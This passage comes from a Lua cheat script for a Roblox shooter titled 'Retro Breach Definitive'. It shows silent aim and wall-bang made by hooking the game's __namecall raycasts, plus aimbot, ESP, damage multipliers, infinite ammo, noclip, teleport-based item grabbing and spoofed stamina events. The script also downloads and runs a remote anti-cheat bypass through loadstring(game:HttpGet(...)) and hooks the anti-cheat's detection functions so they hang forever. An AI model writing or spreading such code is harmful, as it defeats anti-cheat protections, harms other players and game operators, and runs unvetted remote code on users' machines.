                    stats.Damage = originalDamageValues.Damage * Config.DamageMultiplier
                end
                if stats.HeadshotMultiplier then
                    if not originalDamageValues.HeadshotMultiplier then
                        originalDamageValues.HeadshotMultiplier = stats.HeadshotMultiplier
                    end
                    stats.HeadshotMultiplier = originalDamageValues.HeadshotMultiplier * Config.DamageMultiplier
                end
            else
                if originalDamageValues.Damage and stats.Damage then
                    stats.Damage = originalDamageValues.Damage
                end
               if originalDamageValues.HeadshotMultiplier and stats.HeadshotMultiplier then
                    stats.HeadshotMultiplier = originalDamageValues.HeadshotMultiplier
                end
            end
        end)
    end
    
    if Config.InfiniteAmmo then
        local tool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool")
        if tool then
            local ammo = tool:FindFirstChild("Ammo")
            if ammo then
                local mag = ammo:FindFirstChild("Mag")
                if mag and mag.Value < 2 then
                    mag.Value = 2
                end
            end
            
            ammoGuiCacheTimer = ammoGuiCacheTimer + 1
            if ammoGuiCacheTimer >= 120 or not cachedAmmoCount or not cachedAmmoCount.Parent then
                ammoGuiCacheTimer = 0
                cachedAmmoCount = nil
                pcall(function()
                    local screenGui = LocalPlayer.PlayerGui:FindFirstChild("ScreenGui")
                    if screenGui then
                        local weaponFrame = screenGui:FindFirstChild("WeaponFrame")
                        if weaponFrame then
                            local alignment = weaponFrame:FindFirstChild("Alignment")
                            if alignment then
                                local gunFrame = alignment:FindFirstChild("GunFrame")
                                if gunFrame then
                                    cachedAmmoCount = gunFrame:FindFirstChild("AmmoCount")
                                end
                            end
                        end
                    end
                end)
            end
            
            if cachedAmmoCount and cachedAmmoCount:IsA("TextLabel") then
                cachedAmmoCount.Text = "INF"
            end
        end
    end
end)
table.insert(_G.RetroBreach.Connections, rapidFireConnection)

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/refs/heads/main/Source.lua"))()
end)

task.spawn(function()
    task.wait(0.1)
    for _, gui in pairs(LocalPlayer.PlayerGui:GetChildren()) do
        if gui:IsA("ScreenGui") then
            for _, child in pairs(gui:GetDescendants()) do
                if child:IsA("TextLabel") or child:IsA("TextButton") then
                    if string.find(string.lower(child.Text or ""), "pixeluted") or 
                       string.find(string.lower(child.Text or ""), "adonis") or
                       string.find(string.lower(child.Text or ""), "bypassed") then
                        gui:Destroy()
                        break
                    end
                end
            end
        end
    end
end)


if getgc and hookfunc and typeof then
    pcall(function()
        for i,v in pairs(getgc(true)) do
            if typeof(v) == "table" and typeof(rawget(v, "Detected")) == "function" then
                hookfunc(rawget(v, "Detected"), function() return task.wait(9e9) end)
            end
        end
    end)
end


local SilentAimTarget = nil
local SilentAimTargetPart = nil
local WallBangPlayerChars = {}

RunService.Heartbeat:Connect(function()
    if Config.SilentAim then
        SilentAimTarget = getClosestPlayerForSilentAim()
        if SilentAimTarget and SilentAimTarget.Character then
            SilentAimTargetPart = _getHead(SilentAimTarget.Character)
        else
            SilentAimTargetPart = nil
        end
    else
        SilentAimTarget = nil
        SilentAimTargetPart = nil
    end
    
    if Config.WallBang then
        WallBangPlayerChars = {}
        for _, player in pairs(Players:GetPlayers()) do
            if player.Character and player ~= LocalPlayer then
                table.insert(WallBangPlayerChars, player.Character)
            end
        end
    end
end)

local Namecall = nil
Namecall = hookmetamethod(game, "__namecall", function(Self, ...)
    local Method = getnamecallmethod()
    local Args = {...}
    
    if not checkcaller() then
        if Method == "Raycast" then
            local debugInfo = debug.getinfo(3)
            if debugInfo and debugInfo.source and typeof(debugInfo.source) == "string" and string.find(debugInfo.source, "WeaponSystem") then
                if SilentAimTargetPart then
                    local Direction = (SilentAimTargetPart.Position - Args[1]).Unit * 1000
                    Args[2] = Direction
                end
                
                if Config.WallBang and Args[3] and #WallBangPlayerChars > 0 then
                    local newParams = RaycastParams.new()
                    newParams.FilterType = Enum.RaycastFilterType.Include
                    newParams.FilterDescendantsInstances = WallBangPlayerChars
                    Args[3] = newParams
                end
            end
            return Namecall(Self, table.unpack(Args))
        end
    end
    
    return Namecall(Self, ...)
end)

UILib:CreateNotification({
    Text = "Silent Aim loaded!",
    Duration = 3
})
local Window = UILib:CreateWindow({
    Title = "Retro Breach Definitive",
    Size = UDim2.fromOffset(550, 400),
    Position = UDim2.fromOffset(100, 100)
})
table.insert(_G.RetroBreach.Guis, Window.ScreenGui)
Window:AddToggleKey(Enum.KeyCode.RightShift)

local mobileToggleButton = Instance.new("TextButton")
mobileToggleButton.Name = "MobileToggle"
mobileToggleButton.Size = UDim2.new(0, 50, 0, 50)
mobileToggleButton.Position = UDim2.new(1, -70, 0, 20)
mobileToggleButton.AnchorPoint = Vector2.new(0, 0)
mobileToggleButton.BackgroundColor3 = Color3.fromRGB(255, 20, 147)
mobileToggleButton.Text = "J"
mobileToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
mobileToggleButton.TextSize = 24
mobileToggleButton.Font = Enum.Font.GothamBold
mobileToggleButton.Parent = LocalPlayer.PlayerGui:WaitForChild("ScreenGui", 5) or LocalPlayer.PlayerGui

local toggleCorner = Instance.new("UICorner")
toggleCorner.CornerRadius = UDim.new(0, 12)
toggleCorner.Parent = mobileToggleButton

local toggleStroke = Instance.new("UIStroke")
toggleStroke.Color = Color3.fromRGB(255, 255, 255)
toggleStroke.Thickness = 2
toggleStroke.Parent = mobileToggleButton

mobileToggleButton.MouseButton1Click:Connect(function()
    if Window and Window.ScreenGui then
        Window.ScreenGui.Enabled = not Window.ScreenGui.Enabled
        if Window.ScreenGui.Enabled then
            mobileToggleButton.BackgroundColor3 = Color3.fromRGB(255, 20, 147)
        else
            mobileToggleButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
        end
    end
end)

table.insert(_G.RetroBreach.Guis, mobileToggleButton.Parent)

UILib:CreateNotification({Text = "Press Right Shift or tap J button to toggle UI", Duration = 5})
local CombatPanel = UILib:CreatePanel(Window, {
    Name = "Combat",
    DisplayName = "Combat"
})
UILib:CreateToggle(CombatPanel, {
    Label = "Aimbot (Hold Right Click)",
    Default = false,
    Callback = function(value)
        Config.Aimbot = value
    end
})
UILib:CreateSlider(CombatPanel, {
    Text = "Aimbot FOV",
    Min = 50,
    Max = 500,
    Default = 200,
    Callback = function(value)
        Config.AimbotFOV = value
    end
})
UILib:CreateSlider(CombatPanel, {
    Text = "Aimbot Smoothness",
    Min = 1,
    Max = 20,
    Default = 5,
    Callback = function(value)
        Config.AimbotSmooth = value
    end
})
UILib:CreateToggle(CombatPanel, {
    Label = "Show Aimbot FOV Circle",
    Default = true,
    Callback = function(value)
        Config.ShowAimbotFOV = value
    end
})
UILib:CreateToggle(CombatPanel, {
    Label = "Silent Aim",
    Default = false,
    Callback = function(value)
        Config.SilentAim = value
    end
})
UILib:CreateSlider(CombatPanel, {
    Text = "Silent Aim FOV",
    Min = 50,
    Max = 500,
    Default = 200,
    Callback = function(value)
        Config.SilentAimFOV = value
    end
})
UILib:CreateToggle(CombatPanel, {
    Label = "Show Silent Aim FOV Circle",
    Default = true,
    Callback = function(value)
        Config.ShowSilentAimFOV = value
    end
})

UILib:CreateToggle(CombatPanel, {
    Label = "Wall Bang (Thin Walls)",
    Default = false,
    Callback = function(value)
        Config.WallBang = value
    end
})

UILib:CreateToggle(CombatPanel, {
    Label = "Rapid Fire",
    Default = false,
    Callback = function(value)
        Config.RapidFire = value
    end
})
UILib:CreateToggle(CombatPanel, {
    Label = "Infinite Ammo",
    Default = false,
    Callback = function(value)
        Config.InfiniteAmmo = value
    end
})
UILib:CreateToggle(CombatPanel, {
    Label = "No Recoil",
    Default = false,
    Callback = function(value)
        Config.NoRecoil = value
    end
})
UILib:CreateToggle(CombatPanel, {
    Label = "No Spread",
    Default = false,
    Callback = function(value)
        Config.NoSpread = value
    end
})
UILib:CreateSlider(CombatPanel, {
    Text = "Damage Multiplier",
    Min = 1,
    Max = 10,
    Default = 1,
    Callback = function(value)
        Config.DamageMultiplier = value
    end
})

local ESPPanel = UILib:CreatePanel(Window, {
    Name = "ESP",
    DisplayName = "ESP"
})
UILib:CreateToggle(ESPPanel, {
    Label = "Player ESP",
    Default = false,
    Callback = function(value)
        Config.PlayerESP = value
        if value then
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character then
                    createPlayerESP(player.Character)
                end
            end
        else
            for _, esp in pairs(_G.RetroBreach.ESPHighlights) do
                if esp.highlight then pcall(function() esp.highlight:Destroy() end) end
                if esp.teamText then pcall(function() esp.teamText:Remove() end) end
                if esp.nameText then pcall(function() esp.nameText:Remove() end) end
            end
            _G.RetroBreach.ESPHighlights = {}
        end
    end
})
UILib:CreateToggle(ESPPanel, {
    Label = "Item ESP",
    Default = false,
    Callback = function(value)
        Config.ItemESP = value
        updateItemESP()
    end
})
UILib:CreateButton(ESPPanel, {
    Text = "Refresh ESP",
    Callback = function()
        updateItemESP()
    end
})
local PlayerPanel = UILib:CreatePanel(Window, {
    Name = "Player",
    DisplayName = "Player"
})
UILib:CreateSlider(PlayerPanel, {
    Text = "Walk Speed",
    Min = 16,
    Max = 200,
    Default = 16,
    Callback = function(value)
        Config.WalkSpeed = value
    end
})
UILib:CreateSlider(PlayerPanel, {
    Text = "Jump Power",
    Min = 50,
    Max = 200,
    Default = 50,
    Callback = function(value)
        Config.JumpPower = value
    end
})
local originalCollisionStates = {}
UILib:CreateToggle(PlayerPanel, {
    Label = "NoClip (Toggle Or Hold B)",
    Default = false,
    Callback = function(value)
        Config.NoClip = value
        if not value and LocalPlayer.Character then
            for part, originalState in pairs(originalCollisionStates) do
                if part and part.Parent then
                    part.CanCollide = originalState
                end
            end
            originalCollisionStates = {}
        elseif value and LocalPlayer.Character then
            for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    originalCollisionStates[part] = part.CanCollide
                end
            end
        end
    end
})

UILib:CreateToggle(PlayerPanel, {
    Label = "Infinite Stamina",
    Default = false,
    Callback = function(value)
        Config.InfiniteStamina = value
    end
})

local selectedItem = nil
local allItems = {}

local function getUniqueItems()
    local success, result = pcall(function()
        local itemsFolder = Workspace:FindFirstChild("ItemSpawns")
        if not itemsFolder then
            return {"No ItemSpawns folder"}
        end
        
        if not LocalPlayer.Character then
            return {"Waiting for character..."}
        end
        
        local myRoot = getRoot(LocalPlayer.Character)
        if not myRoot then
            return {"No HumanoidRootPart"}
        end
        
        local excludeList = {
            "EZ1", "EZ2", "EZ3", "EZ4",
            "HCZ1", "HCZ2",
            "LCZ1", "LCZ2", "LCZ3", "LCZ4", "LCZ5", "LCZ6", "LCZ7", "LCZ8",
            "Part", "SU1"
        }
        
        local itemDistances = {}
        local MAX_DISTANCE = 2500
        
        for _, item in ipairs(itemsFolder:GetChildren()) do
            local itemName = item.Name
            local shouldExclude = false
            for _, excluded in ipairs(excludeList) do
                if itemName == excluded then
                    shouldExclude = true
                    break
                end
            end
            
            if not shouldExclude then
                local handle = item:FindFirstChild("Handle") or item:FindFirstChildWhichIsA("BasePart")
                if handle then
                    local distance = (handle.Position - myRoot.Position).Magnitude
                    if not itemDistances[itemName] or distance < itemDistances[itemName] then
                        itemDistances[itemName] = distance
                    end
                end
            end
        end
        
        local itemNames = {}
        for itemName, distance in pairs(itemDistances) do
            if distance <= MAX_DISTANCE then
                table.insert(itemNames, itemName)
            else
            end
        end
        table.sort(itemNames)
        
        if #itemNames == 0 then
            return {"No items within 2500 studs"}
        end
        
        return itemNames
    end)
    
    if success then
        return result
    else
        return {"Error scanning items"}
    end
end

allItems = getUniqueItems()

local itemDropdown = UILib:CreateDropdown(PlayerPanel, {
    Label = "Items Within 2500 Studs",
    Options = allItems,
    EnableSearch = true,
    Callback = function(option)
        selectedItem = option
    end
})

task.spawn(function()
    while true do
        task.wait(3)
        local newItems = getUniqueItems()
        
        if itemDropdown and itemDropdown.UpdateOptions then
            itemDropdown.UpdateOptions(newItems)
        end
        
        allItems = newItems
    end
end)

local function smoothTeleport(targetPos, stepSize)
    local success, result = pcall(function()
        if not LocalPlayer.Character then return false end
        local myRoot = getRoot(LocalPlayer.Character)
        if not myRoot then return false end
        
        local startPos = myRoot.Position
        local distance = (targetPos - startPos).Magnitude
        
        local steps = math.ceil(distance / stepSize)
        local MAX_STEPS = 15
        
        if steps > MAX_STEPS then
            stepSize = math.ceil(distance / MAX_STEPS)
            steps = MAX_STEPS
        end
        
        for i = 1, steps do
            if not myRoot or not myRoot.Parent then break end
            
            local alpha = i / steps
            local newPos = startPos:Lerp(targetPos, alpha)
            
            pcall(function()
                myRoot.CFrame = CFrame.new(newPos)
                myRoot.Velocity = Vector3.new(0, 0, 0)
                myRoot.RotVelocity = Vector3.new(0, 0, 0)
                if myRoot.AssemblyLinearVelocity then
                    myRoot.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                end
                if myRoot.AssemblyAngularVelocity then
                    myRoot.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                end
            end)
            
            RunService.Heartbeat:Wait()
            task.wait(math.random(10, 15) / 100)
            
            if i % 5 == 0 then
                task.wait(0.1)
            end
        end
        
        return true
    end)
    
    return success and result
end

local function smoothTeleport(targetPosition, stepSize)
    stepSize = stepSize or 50
    local char = LocalPlayer.Character
    if not char then return end
    
    local myRoot = getRoot(char)
    if not myRoot then return end
    
    local startPos = myRoot.Position
    local distance = (targetPosition - startPos).Magnitude
    local steps = math.ceil(distance / stepSize)
    
    for i = 1, steps do
        if not myRoot or not myRoot.Parent then break end
        
        local alpha = i / steps
        local nextPos = startPos:Lerp(targetPosition, alpha)
        
        myRoot.Velocity = Vector3.new(0, 0, 0)
        myRoot.RotVelocity = Vector3.new(0, 0, 0)
        if myRoot:FindFirstChild("AssemblyLinearVelocity") then
            myRoot.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
        end
        if myRoot:FindFirstChild("AssemblyAngularVelocity") then
            myRoot.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
        end
        
        myRoot.CFrame = CFrame.new(nextPos)
        RunService.Heartbeat:Wait()
        
        if i % 5 == 0 then
            task.wait(0.05)
        end
    end
end

local lastGrabTime = 0
local GRAB_COOLDOWN = 6

UILib:CreateButton(PlayerPanel, {
    Text = "Grab Selected Item",
    Callback = function()
        local currentTime = tick()
        local timeSinceLastGrab = currentTime - lastGrabTime
        
        if timeSinceLastGrab < GRAB_COOLDOWN then
            local remaining = math.ceil(GRAB_COOLDOWN - timeSinceLastGrab)
            UILib:CreateNotification({
                Text = "Cooldown! Wait " .. remaining .. " seconds",
                Duration = 2
            })
            return
        end
        
        lastGrabTime = currentTime
        
        task.spawn(function()
            local _getRoot = getRoot
            local _getHumanoid = getHumanoid
            local _fireproximityprompt = fireproximityprompt
            local _fireclickdetector = fireclickdetector
            local _LocalPlayer = LocalPlayer
            local _Workspace = Workspace
            local _Camera = Camera
            local _task_wait = task.wait
            local _pcall = pcall
            local _warn = warn
            local _Vector3_new = Vector3.new
            local _CFrame_new = CFrame.new
            local _math_floor = math.floor
            local _math_huge = math.huge
            local _ipairs = ipairs
            
            local success, err = _pcall(function()
                if not selectedItem or selectedItem == "Scanning..." or selectedItem == "No items found" or selectedItem == "No ItemSpawns folder" then
                    return
                end
                
                if not _LocalPlayer.Character then
                    return
                end
                
                local myRoot = _getRoot(_LocalPlayer.Character)
                if not myRoot then
                    return
                end
                
                local itemsFolder = _Workspace:FindFirstChild("ItemSpawns")
                if not itemsFolder then
                    return
                end
                
               local targetItem = nil
                local targetItemModel = nil
                local closestDistance = _math_huge
                
                for _, item in _ipairs(itemsFolder:GetChildren()) do
                    if item.Name == selectedItem then
                        local handle = item:FindFirstChild("Handle") or item:FindFirstChildWhichIsA("BasePart")
                        if handle then
                            local distance = (handle.Position - myRoot.Position).Magnitude
                            if distance < closestDistance then
                                closestDistance = distance
                                targetItem = handle
                                targetItemModel = item
                            end
                        end
                    end
                end
                
                if targetItem and targetItemModel then
                    local originalPos = myRoot.CFrame
                    
                    local collisionStates = {}
                    for _, part in ipairs(_LocalPlayer.Character:GetDescendants()) do
                        if part:IsA("BasePart") then
                            collisionStates[part] = part.CanCollide
                            part.CanCollide = false
                        end
                    end
                    
                    local offsetDirection = (myRoot.Position - targetItem.Position).Unit
                    local offsetPosition = targetItem.Position + (offsetDirection * _Vector3_new(3, 0, 3)) + _Vector3_new(0, 2, 0)
                    myRoot.CFrame = _CFrame_new(offsetPosition, targetItem.Position)
                    
                    _Camera.CameraType = Enum.CameraType.Scriptable
                    _Camera.CFrame = _CFrame_new(_Camera.CFrame.Position, targetItem.Position)
                    
                    _task_wait(0.1)
                    
                    _Camera.CameraType = Enum.CameraType.Custom
                    
                    local proximityPrompt = targetItemModel:FindFirstChildOfClass("ProximityPrompt", true)
                    if not proximityPrompt then
                        for _, descendant in ipairs(targetItemModel:GetDescendants()) do
                            if descendant:IsA("ProximityPrompt") then
                                proximityPrompt = descendant
                                break
                            end
                        end
                    end
                    
                    if proximityPrompt then
                        if proximityPrompt.Parent.Name ~= selectedItem then
                            
                            for part, state in pairs(collisionStates) do
                                if part and part.Parent then
                                    part.CanCollide = state
                                end
                            end
                            return
                        end
                        
                        if proximityPrompt and proximityPrompt.Parent then
                            if not proximityPrompt.Enabled then
                                proximityPrompt.Enabled = true
                                _task_wait(0.05)
                            end
                            
                            if myRoot and myRoot.Parent then
                                local currentDist = (targetItem.Position - myRoot.Position).Magnitude
                                
                                if currentDist > 10 then
                                    
                                    for part, state in pairs(collisionStates) do
                                        if part and part.Parent then
                                            part.CanCollide = state
                                        end
                                    end
                                    return
                                end
                            else
                                for part, state in pairs(collisionStates) do
                                    if part and part.Parent then
                                        part.CanCollide = state
                                    end
                                end
                                return
                            end
                            
                            if not proximityPrompt.Enabled then
                                for part, state in pairs(collisionStates) do
                                    if part and part.Parent then
                                        part.CanCollide = state
                                    end
                                end
                                return
                            end
                            
                            local fireSuccess, fireErr = _pcall(function()
                                _Camera.CFrame = _CFrame_new(myRoot.Position, targetItem.Position)
                                
                                local VIM = game:GetService("VirtualInputManager")
                                local itemScreenPos = _Camera:WorldToViewportPoint(targetItem.Position)
                                
                                for i = 1, 5 do
                                    VIM:SendMouseButtonEvent(itemScreenPos.X, itemScreenPos.Y, 0, true, game, 1)
                                    _task_wait(0.05)
                                    VIM:SendMouseButtonEvent(itemScreenPos.X, itemScreenPos.Y, 0, false, game, 1)
                                    _task_wait(0.05)
                                end
                                
                                for i = 1, 2 do
                                    VIM:SendKeyEvent(true, Enum.KeyCode.E, false, game)
                                    _task_wait(0.1)
                                    VIM:SendKeyEvent(false, Enum.KeyCode.E, false, game)
                                    _task_wait(0.05)
                                end
                            end)
                        end
                        task.wait(0.05)
                    else
                        local clickDetector = targetItemModel:FindFirstChildOfClass("ClickDetector", true)
                        if not clickDetector then
                            for _, descendant in ipairs(targetItemModel:GetDescendants()) do
                                if descendant:IsA("ClickDetector") then
                                    clickDetector = descendant
                                    break
                                end
                            end
                        end
                        
                        if clickDetector then
                            local clickSuccess = _pcall(function()
                                _fireclickdetector(clickDetector)
                            end)
                            _task_wait(0.05)
                        else
                        end
                    end
                    
                    _task_wait(0.02)
                    
                    for part, state in pairs(collisionStates) do
                        if part and part.Parent then
                            part.CanCollide = state
                        end
                    end
                    
                    if myRoot and myRoot.Parent then
                        local humanoid = _getHumanoid(_LocalPlayer.Character)
                        if humanoid then
                            humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                        end
                        _task_wait(0.02)
                        myRoot.CFrame = originalPos
                    end
                else
                end
            end)
            
            if not success then
            end
        end)
    end
})
UILib:CreateButton(PlayerPanel, {
    Text = "Escape",
    Callback = function()
        local success, err = pcall(function()
            if not LocalPlayer.Character then
                return
            end
            local myRoot = getRoot(LocalPlayer.Character)
            if not myRoot then
                return
            end
            
            local originalPos = myRoot.CFrame
            local escapePos = Vector3.new(1112.26, 566.00, 56.86)
            local distance = (escapePos - myRoot.Position).Magnitude
            
            if distance > 2500 then
                UILib:CreateNotification({
                    Text = "Escape too far: " .. math.floor(distance) .. " studs! (Max 2500)",
                    Duration = 4
                })
                return
            end
            
            myRoot.CFrame = CFrame.new(escapePos)
            
            task.wait(0.2)
            
            if myRoot and myRoot.Parent then
                myRoot.Velocity = Vector3.new(0, 0, 0)
                myRoot.RotVelocity = Vector3.new(0, 0, 0)
                local humanoid = getHumanoid(LocalPlayer.Character)
                if humanoid then
                    humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                end
                myRoot.CFrame = originalPos
            end
        end)
        if not success then
        end
    end
})
UILib:CreateButton(PlayerPanel, {
    Text = "Refresh Items List",
    Callback = function()
        local success, err = pcall(function()
            local itemsFolder = Workspace:FindFirstChild("ItemSpawns")
            if not itemsFolder then
                return
            end
            
            local excludeList = {
                "EZ1", "EZ2", "EZ3", "EZ4",
                "HCZ1", "HCZ2",
                "LCZ1", "LCZ2", "LCZ3", "LCZ4", "LCZ5", "LCZ6", "LCZ7", "LCZ8",
                "Part", "SU1"
            }
            
            local currentItems = {}
            local seen = {}
            for _, item in ipairs(itemsFolder:GetChildren()) do
                local itemName = item.Name
                local shouldExclude = false
                for _, excluded in ipairs(excludeList) do
                    if itemName == excluded then
                        shouldExclude = true
                        break
                    end
                end
                
                if not shouldExclude and not seen[itemName] then
                    seen[itemName] = true
                    table.insert(currentItems, itemName)
                end
            end
            table.sort(currentItems)
            
            for i, name in ipairs(currentItems) do
            end
        end)
        if not success then
        end
    end
})
local MiscPanel = UILib:CreatePanel(Window, {
    Name = "Misc",
    DisplayName = "Misc"
})
UILib:CreateToggle(MiscPanel, {
    Label = "Full Bright",
    Default = false,
    Callback = function(value)
        Config.FullBright = value
        if value then
            Lighting.Brightness = 2
            Lighting.ClockTime = 14
            Lighting.FogEnd = 100000
            Lighting.GlobalShadows = false
            Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
        else
            Lighting.Brightness = 1
            Lighting.ClockTime = 12
            Lighting.FogEnd = 100000
            Lighting.GlobalShadows = true
        end
    end
})
UILib:CreateButton(MiscPanel, {
    Text = "Rejoin Server",
    Callback = function()
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
    end
})
UILib:CreateButton(MiscPanel, {
    Text = "Close GUI",
    Callback = function()
        if Window.ScreenGui then
            Window.ScreenGui:Destroy()
        end
    end
})

local noclipKeyHeld = false
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.B then
        noclipKeyHeld = true
        if LocalPlayer.Character and not Config.NoClip then
            for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
                if part:IsA("BasePart") and not originalCollisionStates[part] then
                    originalCollisionStates[part] = part.CanCollide
                end
            end
        end
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.B then
        noclipKeyHeld = false
        if not Config.NoClip and LocalPlayer.Character then
            for part, originalState in pairs(originalCollisionStates) do
                if part and part.Parent then
                    part.CanCollide = originalState
                end
            end
            originalCollisionStates = {}    
        end
    end
end)
local mainLoop = RunService.RenderStepped:Connect(function()
    updateAimbot()
    updatePlayerESP()
    updateItemESP()
end)
table.insert(_G.RetroBreach.Connections, mainLoop)
local playerLoop = RunService.Heartbeat:Connect(function()
    if LocalPlayer.Character then
        local humanoid = getHumanoid(LocalPlayer.Character)
        if humanoid then
            if Config.WalkSpeed ~= 16 then
                humanoid.WalkSpeed = Config.WalkSpeed
            end
            if Config.JumpPower ~= 50 then
                humanoid.JumpPower = Config.JumpPower
            end
        end
        if Config.NoClip or noclipKeyHeld then
            for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end
end)
table.insert(_G.RetroBreach.Connections, playerLoop)
Players.PlayerAdded:Connect(function(player)
    if player.Character and Config.PlayerESP then
        player.Character:WaitForChild("HumanoidRootPart", 5)
        task.wait(0.2)
        createPlayerESP(player.Character)
    end
    player.CharacterAdded:Connect(function(character)
        if Config.PlayerESP then
            character:WaitForChild("HumanoidRootPart", 5)
            task.wait(0.2)
            createPlayerESP(character)
        end
    end)
end)
Players.PlayerRemoving:Connect(function(player)
    if player and player.Character and _G.RetroBreach.ESPHighlights[player.Character] then
        local esp = _G.RetroBreach.ESPHighlights[player.Character]
        if esp.highlight then pcall(function() esp.highlight:Destroy() end) end
        if esp.teamText then pcall(function() esp.teamText:Remove() end) end
        if esp.nameText then pcall(function() esp.nameText:Remove() end) end
        _G.RetroBreach.ESPHighlights[player.Character] = nil
    end
end)
for _, player in ipairs(Players:GetPlayers()) do
    player.CharacterAdded:Connect(function(character)
        if Config.PlayerESP then
            character:WaitForChild("HumanoidRootPart", 5)
            task.wait(0.2)
            createPlayerESP(character)
        end
    end)
end

if UILib.CreateNotification then
    UILib:CreateNotification({
        Text = "Retro Breach Definitive Loaded!",
        Duration = 5,
        Color = UILib.Colors and UILib.Colors.SUCCESS or Color3.fromRGB(0, 255, 0)
    })
end
task.spawn(function()
    task.wait(1)
    local itemsFolder = Workspace:FindFirstChild("ItemSpawns")
    if itemsFolder then
        local itemNames = {}
        for _, item in ipairs(itemsFolder:GetChildren()) do
            if not table.find(itemNames, item.Name) then
                table.insert(itemNames, item.Name)
            end
        end
        table.sort(itemNames)
    else
    end
end)

local _ReplicatedStorage = game:GetService("ReplicatedStorage")
local _firesignal = firesignal
local _pcall = pcall
local _task_wait = task.wait

task.spawn(function()
    while _task_wait(7) do
        _pcall(function()
            if not Config.InfiniteStamina then return end
            if not LocalPlayer.Character then return end
            
            local remoteEvents = _ReplicatedStorage:FindFirstChild("RemoteEvents")
            if not remoteEvents then return end
            
            local restoreStamina = remoteEvents:FindFirstChild("RestoreStamina")
            if not restoreStamina then return end
            
            if _firesignal and restoreStamina.OnClientEvent then
                _firesignal(restoreStamina.OnClientEvent)
            end
        end)
    end
end)